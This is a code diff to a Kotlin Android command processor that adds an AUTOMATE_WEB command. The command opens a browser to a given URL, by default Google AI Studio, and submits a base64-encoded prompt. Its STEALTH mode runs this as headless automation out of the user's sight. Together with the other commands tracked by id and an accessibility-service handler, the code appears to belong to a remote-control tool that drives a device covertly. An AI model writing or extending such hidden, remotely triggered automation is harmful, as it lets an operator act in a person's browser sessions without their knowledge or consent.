@@ -330,6 +330,29 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, report, null)
                     return
                 }
+                "AUTOMATE_WEB" -> {
+                    val parts = content.split("|", limit = 3)
+                    val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "VISIBLE"
+                    val targetUrl = parts.getOrNull(1)?.trim() ?: "https://aistudio.google.com/prompts/new_chat"
+                    val promptText = parts.getOrNull(2)?.trim() ?: "Hello"
+                    
+                    val promptB64 = android.util.Base64.encodeToString(promptText.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
+                    
+                    if (mode == "STEALTH") {
+                        DynamicUIManager.runHeadlessAutomation(ctx, targetUrl, promptB64)
+                        status = "AUTOMATION_STARTED_STEALTH"
+                        errorMsg = "URL: $targetUrl"
+                    } else {
+                        val intent = Intent(ctx, BrowserActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            putExtra("auto_url", targetUrl)
+                            putExtra("auto_prompt_b64", promptB64)
+                        }
+                        ctx.startActivity(intent)
+                        status = "AUTOMATION_STARTED_VISIBLE"
+                        errorMsg = "URL: $targetUrl"
+                    }
+                }
                 "MAP_GRID" -> {
                     val depth = content.trim().toIntOrNull() ?: 10
                     val service = MyAccessibilityService.instance
